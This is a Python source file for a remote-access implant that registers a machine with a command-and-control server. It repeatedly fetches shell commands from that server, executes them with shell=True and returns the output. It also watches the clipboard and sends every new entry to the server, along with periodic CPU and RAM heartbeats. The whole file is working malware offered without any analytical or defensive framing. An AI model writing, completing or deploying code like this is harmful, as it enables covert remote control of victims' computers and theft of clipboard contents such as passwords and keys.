import requests
import pyperclip
import psutil
import os
import socket
import time
import subprocess
import threading
from dotenv import load_dotenv

load_dotenv()
C2_URL = os.getenv("C2_URL")
HOSTNAME = socket.gethostname()

def register():
    try:
        data = {
            "hostname": HOSTNAME,
            "ip_address": socket.gethostbyname(HOSTNAME)
        }
        response = requests.post(f"{C2_URL}/register", json=data)
        if response.status_code == 200:
            print(f"[*] Registered successfully: {HOSTNAME}")
            return True
    except Exception as e:
        print(f"[!] Registration failed: {e}")
    return False

def exfiltrate(data_type, content):
    try:
        data = {
            "hostname": HOSTNAME,
            "type": data_type,
            "content": str(content)
        }
        requests.post(f"{C2_URL}/exfiltrate", json=data)
    except Exception:
        pass

def check_commands():
    while True:
        try:
            response = requests.get(f"{C2_URL}/command/next/{HOSTNAME}")
            if response.status_code == 200 and response.text:
                cmd_data = response.json()
                if cmd_data:
                    cmd_id = cmd_data['id']
                    command = cmd_data['command']
                    print(f"[*] Executing command: {command}")
                    
                    try:
                        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                        result = result.decode()
                    except subprocess.CalledProcessError as e:
                        result = e.output.decode()
                    except Exception as e:
                        result = str(e)
                    
                    requests.post(f"{C2_URL}/command/result", json={
                        "commandId": cmd_id,
                        "result": result or "Command executed with no output."
                    })
        except Exception:
            pass
        time.sleep(3)

def monitor_clipboard():
    last_clip = ""
    while True:
        try:
            current_clip = pyperclip.paste()
            if current_clip != last_clip:
                last_clip = current_clip
                if current_clip.strip():
                    exfiltrate("clipboard", current_clip)
        except Exception:
            pass
        time.sleep(5)

def send_heartbeat():
    while True:
        try:
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            content = f"CPU: {cpu}% | RAM: {ram}%"
            exfiltrate("heartbeat", content)
        except Exception:
            pass
        time.sleep(30)

if __name__ == "__main__":
    print("[*] Starting Agent...")
    while not register():
        time.sleep(10)
    
    # Start threads
    threading.Thread(target=check_commands, daemon=True).start()
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    threading.Thread(target=send_heartbeat, daemon=True).start()
    
    print("[*] Agent is running. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Stopping Agent.")
